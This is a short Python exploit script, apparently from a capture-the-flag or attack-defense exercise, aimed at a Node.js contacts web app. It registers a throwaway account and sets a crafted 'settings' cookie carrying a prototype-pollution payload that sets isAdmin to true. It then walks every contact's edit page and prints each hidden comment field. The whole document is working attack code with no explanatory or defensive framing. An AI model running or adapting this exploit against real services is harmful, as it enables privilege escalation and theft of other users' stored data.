#!/usr/bin/env python3

import sys
import string
import random
import requests
requests.packages.urllib3.disable_warnings()
from urllib.parse import urljoin
from lxml import etree

def get_random_string(min_len, max_len):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(random.randint(min_len, max_len)))

def main(host):
    base_url = f"https://{host}/"

    user = get_random_string(5, 15)
    password = get_random_string(7, 20)

    print(f"[*] Registering new user '{user}:{password}'")
    data = {"username": user, "password": password}
    r = requests.post(urljoin(base_url, '/register'), data=data, verify=False, allow_redirects=False)
    if r.status_code != 302:
        print("[*] Can't register new user")
        return

    cookies = r.cookies
    if 'connect.sid' in r.cookies:
        print(f"[*] Got session cookie: connect.sid={r.cookies['connect.sid']}")

    cookies['settings'] = 'j:["__proto__",":",{"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}}]'

    print("[*] Getting contact list")
    r = requests.get(base_url, cookies=cookies, verify=False, allow_redirects=False)
    if r.status_code != 200:
        print("[*] Can't get contact list")
        return

    parser = etree.HTMLParser()
    parser.feed(r.text)
    doc = parser.close()

    elements = doc.xpath("//tbody/tr/td[contains(@class, 'js-name')]/a/@href")
    print(f"[*] Got {len(elements)} contacts")
    print("[*] Getting contacts")
    for e in elements:
        contact_id = e.rsplit('/', 1)[-1]

        r = requests.get(urljoin(base_url, f"/edit/{contact_id}"), cookies=cookies, verify=False, allow_redirects=False)
        if r.status_code != 200:
            print(f"[*] Can't get contact '{contact_id}'")
            return

        parser = etree.HTMLParser()
        parser.feed(r.text)
        doc = parser.close()

        contact_comment = doc.xpath("//textarea[@name='comment']/text()")[0]
        print(f"[*] {contact_id}: {contact_comment}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"USAGE: {sys.argv[0]} <host>", file=sys.stderr)
        sys.exit(-1)

    main(sys.argv[1])
